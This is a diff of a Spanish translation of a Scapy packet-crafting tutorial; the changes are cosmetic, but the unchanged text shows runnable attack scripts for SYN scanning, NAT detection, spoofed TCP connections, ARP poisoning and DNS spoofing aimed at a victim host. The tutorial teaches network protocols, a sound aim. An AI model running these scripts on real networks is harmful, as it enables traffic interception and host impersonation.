@@ -10,6 +10,7 @@ tags:
 - security
 - scapy
 - networking
+render_with_liquid: false
 ---
 Esta receta en realidad es una traducción de un artículo de Rob Klein titulado "Packet Wizardry: Ruling the Network with Python":http://hackaholic.org/papers/blackmagic.txt usando la magnífica herramienta "scapy":http://www.secdev.org/projects/scapy/. Igual es un poco largo para receta, pero bueno, no tiene desperdicio.
 
@@ -56,7 +57,7 @@ Quiero programar un escaneador de puertos, para escanear una red clase C complet
   >>> for pout, pin in results:
   ...     if pin.flags == 2:
   ...         print pout.dst
-  ... 
+  ...
   24.132.156.5
   24.132.156.19
   24.132.156.24
@@ -69,7 +70,7 @@ Quiero programar un escaneador de puertos, para escanear una red clase C complet
   24.132.156.148
   24.132.156.204
   24.132.156.211
-  >>> 
+  >>>
 </pre>
 
 ¡Bienvenido a esta caja de magia negra llamada Scapy! Qué hemos hecho. Primero cree un paquete que fue enviado a la subred /24 a la que está conectada hackaholic.org y puse el puerto destino 80 y el flag SYN en la cabecera TCP.
@@ -90,14 +91,14 @@ BIen, primero la configuración del entorno de Scapy. Instala la distribución b
 
 <pre class="console">
   detach@luna:~$ python
-  Python 2.3.5c1 (#2, Jan 27 2005, 10:49:01) 
+  Python 2.3.5c1 (#2, Jan 27 2005, 10:49:01)
   [GCC 3.3.5 (Debian 1:3.3.5-6)] on linux2
   Type "help", "copyright", "credits" or "license" for more information.
   >>> if 1+1 == 2:
   ...     print "Thank goodness!"
-  ... 
+  ...
   Thank goodness!
-  >>> 
+  >>>
 </pre>
 
 Lo que más me gusta de Python es que puedes escribir cualquier cosa que tú crees que debería funcionar y funciona. Hay algunas reglas básicas en Python que deberías saber:
@@ -106,14 +107,14 @@ Lo que más me gusta de Python es que puedes escribir cualquier cosa que tú cre
 # No se necesita punto-y-coma como separador de sentencias (pero se puede usar si quieres poner varias sentencias en la misma línea)
 # No se necesitan paréntesis en las sentencias condicionales como IF o WHILE, las sentencias condicionales acaban con ':' después de poner la expresión.
 
-La característica de Python más importante y probablemente más chula es que tiene un modo interactivo nativo. Sí, ese es el modo que acabas de usar. Tú ejecutas 'python' y tiene el indicador '>>>'. 
+La característica de Python más importante y probablemente más chula es que tiene un modo interactivo nativo. Sí, ese es el modo que acabas de usar. Tú ejecutas 'python' y tiene el indicador '>>>'.
 
 Ahora que tenemos Python funcionando vamos con scapy. Descarga scapy de "<a href="http://www.secdev.org/projects/scapy/":http://www.secdev.org/projects/scapy/">http://www.secdev.org/projects/scapy/":http://www.secdev.org/projects/scapy/</a>, en el momento de escribir esto, la versión es 0.9.17beta. Extrae el fuente de Scapy y ejecuta el programa como root[2].
 
 <pre class="console">
   detach@luna:~/lab/scapy-0.9.17$ sudo python ./scapy.py
   Welcome to Scapy (0.9.17.1beta)
-  >>> 
+  >>>
 </pre>
 
 Pudes dejar que scapy guarde todo lo que escribas indicandole un nombre de fichero en la linea de comandos.
@@ -178,7 +179,7 @@ Los comandos/funciones más importantes de scapy, los que necesitas recordar son
   DNSQR      : DNS Question Record
   EAP        : EAP
   IKE_proposal : IKE proposal
-  >>> 
+  >>>
 </pre>
 
 Después explicaré cómo usar esta información
@@ -212,7 +213,7 @@ La función @lsc()@ lista todas las funciones disponibles (de Scapy):
   dyndns_add       : Send a DNS add message to a nameserver for "name" to
                      have a new "rdata"
   dyndns_del       : Send a DNS delete message to a nameserver for "name"
-  >>> 
+  >>>
 </pre>
 
 Otras funciones genéricas importantes:
@@ -237,10 +238,10 @@ Estas funciones @IP()@, @ICMP()@, etc son muy interesantes[3]. Puedes verlas usa
   chksum    = 0x0
   id        = 0x0
   seq       = 0x0
-  >>> sr1(ip/icmp) 
+  >>> sr1(ip/icmp)
   Begin emission:
   ...*Finished to send 1 packets.
-  
+
   Received 4 packets, got 1 answers, remaining 0 packets
   <IP version=4L ihl=5L tos=0x0 len=28 id=16713 flags= frag=0L ttl=64
   proto=ICMP chksum=0xa635 src=192.168.9.1 dst=192.168.9.17 options='' |<ICMP
@@ -254,7 +255,7 @@ Estas funciones @IP()@, @ICMP()@, etc son muy interesantes[3]. Puedes verlas usa
   tos       = 0x0
   len       = 28
   id        = 16713
-  flags     = 
+  flags     =
   frag      = 0L
   ttl       = 64
   proto     = ICMP
@@ -271,7 +272,7 @@ Estas funciones @IP()@, @ICMP()@, etc son muy interesantes[3]. Puedes verlas usa
   ---[ Padding ]---
         load      =
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|)\x0c\xa4'
-  >>> 
+  >>>
 </pre>
 
 Un paquete se puede crear de muchas formas. La más corta es algo como:
@@ -281,14 +282,14 @@ Un paquete se puede crear de muchas formas. La más corta es algo como:
   >>> sr1(p)
   Begin emission:
   ...*Finished to send 1 packets.
-  
+
   Received 4 packets, got 1 answers, remaining 0 packets
   <IP version=4L ihl=5L tos=0x0 len=28 id=16714 flags= frag=0L ttl=64
   proto=ICMP chksum=0xa634 src=192.168.9.1 dst=192.168.9.17 options='' |<ICMP
   type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding
   load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x89\xdb\x88'
   |>>>
-  >>> 
+  >>>
 </pre>
 
 Para encontrar qué campos puede tener cada protocolo, usa @ls()@ con un argumento:
@@ -306,7 +307,7 @@ Para encontrar qué campos puede tener cada protocolo, usa @ls()@ con un argumen
   chksum     : XShortField          = (None)
   urgptr     : ShortField           = (0)
   options    : TCPOptionsField      = ({})
-  >>> 
+  >>>
 </pre>
 
 Así puedes asignar cualquiera de estos campos, también puedes ver cuales son sus valores por defecto. Por ejemplo, el puerto origen por defecto es 20, el puesto destino es 80.
@@ -324,7 +325,7 @@ Cuando se imprime un paquete solo se muestran los campos modficados. Como éste:
   >>> del(i.dst)
   >>> i
   <IP src=192.168.9.2 |>
-  >>> 
+  >>>
 </pre>
 
 Por supuesto, para mostrar todos los campos usa el método @i.display()@. Me gusta mucho esto, puedes ver fácilmente lo que has modificado, no tienes que tratar con campos que no te interesan. Por ejemplo, yo no quiero ver qué opciones TCP están habilitadas, porque yo no uso opciones TCP en la mayoría de los ataques. Si las uso, entonces se muestran. Excelente.
@@ -346,7 +347,7 @@ También puedes usar @ls()@ para mostrar un paquete existente:
   src        : SourceIPField        = '192.168.9.2'   (None)
   dst        : IPField              = '127.0.0.1'     ('127.0.0.1')
   options    : IPoptionsField       = ''              ('')
-  >>> 
+  >>>
 </pre>
 
 
@@ -356,7 +357,7 @@ Se muestra el valor por defecto, y el valor actual. Cuando construyes un paquete
   >>> p = IP(dst="192.168.9.1")/TCP(dport=22)/"AAAAAAAAAA"
   >>> p
   <IP proto=TCP dst=192.168.9.1 |<TCP dport=22 |<Raw load='AAAAAAAAAA' |>>>
-  >>> 
+  >>>
 </pre>
 
 Para enviar paquetes en la capa 2, tienes que usar las funciones @sendp@, @srp@, @srploop@ y @srp1@. La 'p' significa PF_PACKET, que es la interfaz de Linux que permite enviar paquetes en la capa 2.
@@ -384,7 +385,7 @@ Para ver el paquete crudo como una cadena puede ser útil entender la disección
   reserved=0L flags=PUC window=1553 chksum=0xc0a8 urgptr=1 options=[] |>
   >>> raw_packet
   'E\x00\x00(\x00\x01\x00\x00@\x06\xf3l\xc0\xa8\x06\x11\xc0\xa8\x00\x01\x00\x14\x00\x19\x00\x00\x00\x00\x00\x00\x00\x00P\x02\x00\x00(S\x00\x00'
-  >>> 
+  >>>
 </pre>
 
 h2. Construye tus propias herramientas con Scapy
@@ -412,7 +413,7 @@ Esta es la técnica de escaneo de puertos, que aquí aparece como un script, no 
       if a[1].flags == 2:
           print a[1].src
 </pre>
-  
+
 Vamos a probarla:
 
 <pre class="console">
@@ -444,15 +445,15 @@ Bien, hagamos el programa para encontrar el TTL para alcanzar a nuestro objetivo
   ...     ttl = ttl + 1
   ...     p = IP(dst="hackaholic.org", ttl=ttl)/ICMP()
   ...     return p
-  ... 
+  ...
   >>> res = sr1(mkpacket())
   Begin emission:
   ...*Finished to send 1 packets.
-  
+
   Received 4 packets, got 1 answers, remaining 0 packets
   >>> while res.type == 11:
   ...     res = sr1(mkpacket())
-  ... 
+  ...
   Begin emission:
   .Finished to send 1 packets.
   *
@@ -465,9 +466,9 @@ Bien, hagamos el programa para encontrar el TTL para alcanzar a nuestro objetivo
   .Finished to send 1 packets.
   *
   ****** Etcetera,
-  >>> ttl    
+  >>> ttl
   15
-  >>> 
+  >>>
 </pre>
 
 Esto significa que en el salto 15 hemos llegado al host, o que el TTL mínimo para llegar al host es 15. Fíjate en que el constructor de @ICMP()@ no requiere ningún parámetro porque por defecto es un icmp-echo-request. Si ICMP está bloqueado (algo que ocurre mucho hoy en día), puedes intentar con UDP o TCP. Pero recuerda que queremos averiguar la configuración del NAT, is usas TCP entonces utiliza un puerto cerrado. De otro modo, ¿cómo sabes si ese puerto está NATeado? (Nota: incluso los puertos cerrados puede estar NATeados).
@@ -483,54 +484,54 @@ Para hacerlo más automático, aquí está el script completo. Requiere los argu
 <div>
 {% highlight python %}
   #!/usr/bin/env python
-  
+
   import sys
   from scapy import *
   conf.verb=0
-  
+
   if len(sys.argv) != 3:
       print "Usage: ./firewalk.py <target> <dport>"
       sys.exit(1)
-  
+
   dest=sys.argv[1]
   port=sys.argv[2]
-  
+
   ttl = 0
-  
+
   def mkicmppacket():
       global ttl
       ttl = ttl + 1
       p = IP(dst=dest, ttl=ttl)/ICMP()
       return p
-  
+
   def mktcppacket():
       global ttl, dest, port
       ttl = ttl + 1
       p = IP(dst=dest, ttl=ttl)/TCP(dport=int(port), flags="S")
       return p
-  
+
   res = sr1(mkicmppacket())
   while res.type == 11:
       res = sr1(mkicmppacket())
       print "+"
-  
+
   nat_ttl = ttl
   # Since we now know our minimum TTL, we don't need to reset TTL to zero
   # We do need to decrease TTL or otherwise mkpacket will increase it again
   # which would result in every port being detected as forwarded
   ttl = ttl - 1
-  
+
   res = sr1(mktcppacket())
   while res.proto == 1 and res.type == 11:
       res = sr1(mktcppacket())
-  
+
   if res.proto != 6:
       print "Error"
       sys.exit(1)
-  
+
   if nat_ttl == ttl: print "Not NATed (" + str(nat_ttl) + ", " + str(ttl) + ")"
   else: print "This port is NATed. firewall TTL is " + str(nat_ttl) + ", TCP port TTL is " + str(ttl)
-  
+
   sys.exit(0)
 {% endhighlight %}
 </div>
@@ -556,7 +557,7 @@ Veamos cómo funciona:
 
 Esto es mucho más rápido que usar mi implementación de Hping3 (HTCL) :-D
 
-Cuando este script detecta que un host está NATeado, es muy probable que así sea. Si no detecta que un puerto está redireccionado... eso no es una prueba. No es difícil engañar a esta técnica incrementando en uno el TTL de cada paquete entrante y de un puerto redireccionado. Aunque dudo que suceda habitualmente. 
+Cuando este script detecta que un host está NATeado, es muy probable que así sea. Si no detecta que un puerto está redireccionado... eso no es una prueba. No es difícil engañar a esta técnica incrementando en uno el TTL de cada paquete entrante y de un puerto redireccionado. Aunque dudo que suceda habitualmente.
 
 Lo siguiente que vamos a hacer es muy divertido. Probablemente, muchos no comprendáis porqué me parece tan excitante. Lo que vamos a hacer es crear una conexión TCP a un sistema local en la LAN desde una dirección IP ficticia. Esto significa que vamos a hacer spoofing de la conexión, sólo spoofing no-ciego desafortunadamente. El uso de esta técnica es únicamente educativo. Creo que es excitante porque esta teoría de TCP que aprendí hace mucho tiempo es el ejemplo más real de conexión TCP que jamás he visto. Creo que cualquier profesor que explique TCP/IP debería usarlo como un ejemplo en clase en lugar de toda esa teoría abstracta sobre el mecanismo de ventana deslizante y mierdas :-) [4].
 
@@ -571,26 +572,26 @@ Echa un vistazo a este script:
   import sys
   from scapy import *
   conf.verb=0
-  
+
   if len(sys.argv) != 4:
       print "Usage: ./spoof.py <target> <spoofed_ip> <port>"
       sys.exit(1)
-  
+
   target = sys.argv[1]
   spoofed_ip = sys.argv[2]
   port = int(sys.argv[3])
-  
+
   p1=IP(dst=target,src=spoofed_ip)/TCP(dport=port,sport=5000,flags='S')
   send(p1)
   print "Okay, SYN sent. Enter the sniffed sequence number now: "
-  
+
   seq=sys.stdin.readline()
   print "Okay, using sequence number " + seq
-  
+
   seq=int(seq[:-1])
   p2=IP(dst=target,src=spoofed_ip)/TCP(dport=port,sport=5000,flags='A',ack=seq+1,seq=1)
   send(p2)
-  
+
   print "Okay, final ACK sent. Check netstat on your target :-)"
 {% endhighlight %}
 </div>
@@ -606,7 +607,7 @@ Cuando "spoofeas" tu dirección IP, debes asegurarte de que usas una dirección 
   p.hwdst = "ff:ff:ff:ff:ff:ff"
   p.pdst = target
   send(p)
-</pre>  
+</pre>
 
 Esto es _ARP poisoning_. (Fíjate en que esto también podría ser útil si quieres spoofear una conexión desde una IP *EXISTENTE*, porque puedes mantener el envenenamiento de tu objetivo diciéndole que la dirección MAC ha cambiado; el host suplantado no podría responder porque las respuestas irían a una MAC inexistente. Eso implica que puede suplantar totalmente a un sistema conectado.
 
@@ -614,10 +615,10 @@ Vamos a probar:
 
 <pre class="console">
   $ sudo python ./spoof.py 192.168.9.14 123.123.123.123 22
-  Okay, SYN sent. Enter the sniffed sequence number now: 
+  Okay, SYN sent. Enter the sniffed sequence number now:
   231823219
   Okay, using sequence number 231823219
-  
+
   Okay, final ACK sent. Check netstat on your target :-)
   $
 </pre>
@@ -625,7 +626,7 @@ Vamos a probar:
 Ahora en mi objetivo ejecuto @netstat@ dos veces, antes y después de enviar el ACK.
 
 <pre>
-  tcp        0      0 devil.hengelo.gaast:ssh 123.123.123.123:5000 SYN_RECV   
+  tcp        0      0 devil.hengelo.gaast:ssh 123.123.123.123:5000 SYN_RECV
   tcp        0      0 devil.hengelo.gaast:ssh 123:123.123.123:5000 ESTABLISHED
 </pre>
 
@@ -655,8 +656,8 @@ Horrible, ¿no? Sería trivial inyectar segmentos en una "conexión" UDP y mucho
 Pero en general, el spoofing ciego está muerto. Otras técnicas como la redirección de tráfico por medio de envenenamiento ARP, es decir, envenenamiento de tablas de conmutadores, son mucho más exitosas. Otra cosa muy efectiva es el spoofing DNS. Tal vez incluso ataques contra protocolos de enrutamiento, pero no los veo tan a menudo. Pero todo es posible usando Scapy.
 
 Voy a explicar un último ejemplo de ataque de red. Esta vez haremos un envenenamiento DNS.
-                                
-Primero, empezamos enviando una petición DNS. Lo intenté y me llevó un rato entender cómo funcionaba (era la primera vez que programaba un spoofer DNS). Lo que pasé por alto fue que DNS usa 0x03 para indicar el '.' en "hackaholic.org". Extraño. 
+
+Primero, empezamos enviando una petición DNS. Lo intenté y me llevó un rato entender cómo funcionaba (era la primera vez que programaba un spoofer DNS). Lo que pasé por alto fue que DNS usa 0x03 para indicar el '.' en "hackaholic.org". Extraño.
 
 *Actualización*: Philippe Biondi (autor de scapy) me envió un email explicándome el error que cometí aquí:
 
@@ -683,7 +684,7 @@ En cualquier caso, Scapy dice esto sobre DNS:
   an         : DNSRRField           = None            (None)
   ns         : DNSRRField           = None            (None)
   ar         : DNSRRField           = None            (None)
-  >>> 
+  >>>
 </pre>
 
 A la vista de la "RFC-1035":http://www.ietf.org/rfc/rfc1035.txt veo que los siguientes campos son interesantes para enviar una consulta DNS:
@@ -715,22 +716,22 @@ Vamos a hacerlo. Mi servidor de nombres local es 192.168.9.1. El protocolo de tr
   >>> sr1(packet)
   Begin emission:
   ...*Finished to send 1 packets.
-  
+
   Received 4 packets, got 1 answers, remaining 0 packets
   <IP version=4L ihl=5L tos=0x0 len=188 id=12111 flags=DF frag=0L ttl=64 proto=
-  UDP chksum=0x777f src=192.168.9.1 dst=192.168.9.17 options='' |<UDP sport=53 
-  dport=31337 len=168 chksum=0xab33 |<DNS id=31337 qr=1L opcode=16 aa=0L tc=0L 
+  UDP chksum=0x777f src=192.168.9.1 dst=192.168.9.17 options='' |<UDP sport=53
+  dport=31337 len=168 chksum=0xab33 |<DNS id=31337 qr=1L opcode=16 aa=0L tc=0L
   rd=0L ra=1L z=8L rcode=ok qdcount=1 ancount=1 nscount=5 arcount=0 qd=<DNSQR q
   name='hackaholic.org.' qtype=A qclass=IN |> an=<DNSRR rrname='hackaholic.org.
   ' type=A rclass=IN ttl=661L rdata='24.132.169.84' |> ns=<DNSRR rrname='hackah
   olic.org.' type=NS rclass=IN ttl=1177L rdata='dns4.name-services.com.' |<DNSR
   R rrname='hackaholic.org.' type=NS rclass=IN ttl=1177L rdata='dns5.name-servi
   ces.com.' |<DNSRR rrname='hackaholic.org.' type=NS rclass=IN ttl=1177L rdata=
-  'dns1.name-services.com.' |<DNSRR rrname='hackaholic.org.' type=NS rclass=IN 
+  'dns1.name-services.com.' |<DNSRR rrname='hackaholic.org.' type=NS rclass=IN
   ttl=1177L rdata='dns2.name-services.com.' |<DNSRR rrname='hackaholic.org.' ty
   pe=NS rclass=IN ttl=1177L rdata='dns3.name-services.com.' |>>>>> ar=0 |<Paddi
   ng load='6g\xa3\xf8' |>>>>
-  >>> 
+  >>>
 </pre>
 
 Ahora también puedes hacer esto:
@@ -739,11 +740,11 @@ Ahora también puedes hacer esto:
   >>> res =sr1(packet)
   Begin emission:
   .*Finished to send 1 packets.
-  
+
   Received 2 packets, got 1 answers, remaining 0 packets
   >>> res.an.rdata
   '24.132.169.84'
-  >>> 
+  >>>
 </pre>
 
 Chulo, ¿eh? Ahora que estamos seguros podemos intentar fabricar paquetes DNS.
@@ -775,23 +776,23 @@ Estudia y adapta el siguiente código:
   import sys
   from scapy import *
   conf.verb=1
-  
+
   #### Adapt the following settings ####
   conf.iface = 'eth2'
   mac_address = '00:11:22:AA:BB:CC' # Real Mac address of interface conf.iface (Host A)
   ####
-  
+
   if len(sys.argv) != 4:
       print "Usage: ./spoof.py <dns_server> <victim> <impersonating_host>"
       sys.exit(1)
-  
+
   dns_server = sys.argv[1]
   target=sys.argv[2]
   malhost = sys.argv[3]
-  
+
   timevalid = '\x00\x00\x07\x75'
   alen = '\x00\x04'
-  
+
   def arpspoof(psrc, pdst, mac):
       a = ARP()
       a.op = 2
@@ -800,7 +801,7 @@ Estudia y adapta el siguiente código:
       a.hwdst = "ff:ff:ff:ff:ff:ff"
       a.pdst = pdst
       send(a)
-  
+
   def mkdnsresponse(dr, malhost):
       d = DNS()
       d.id = dr.id
@@ -819,24 +820,24 @@ Estudia y adapta el siguiente código:
       d.qd = str(dr.qd)
       d.an = str(dr.qd) + timevalid + alen + inet_aton(malhost)
       return d
-  
+
   ethlen = len(Ether())
   iplen = len(IP())
   udplen = len(UDP())
-  
+
   arpspoof(dns_server, target, mac_address)
   p = sniff(filter='port 53', iface=conf.iface, count=1)
-  
+
   e = p[0]
   t = str(e)
   i = IP(t[ethlen:])
   u = UDP(t[ethlen + iplen:])
   d = DNS(t[ethlen + iplen + udplen:])
-  
+
   dpkt = mkdnsresponse(d, malhost)
-  
+
   dpkt.display()
-  
+
   f = IP(src=i.dst, dst=i.src)/UDP(sport=u.dport, dport=u.sport)/dpkt
   send(f)
 {% endhighlight %}
@@ -887,7 +888,7 @@ El paquete que se muestra es la respuesta spoofeada... y puedes ver que la direc
 
 Debo decir que no he leído mucho sobre el protocolo DNS para programar esto. La mayoría de lo que he aprendido ha sido de Scapy y Ethereal.
 
-*Actualización:* Una persona bondadosa me apunta que en la presentación de Philippe usa la función @DNSRR()@ de scapy para sintetizar respuestas DNS, que por supuesto es una función más sencilla de alto nivel. Así que deberías cambiar la función @mkdnsresponse()@ por algo como esto: 
+*Actualización:* Una persona bondadosa me apunta que en la presentación de Philippe usa la función @DNSRR()@ de scapy para sintetizar respuestas DNS, que por supuesto es una función más sencilla de alto nivel. Así que deberías cambiar la función @mkdnsresponse()@ por algo como esto:
 
 <pre>
   def mkdnsresponse(dr, malhost):
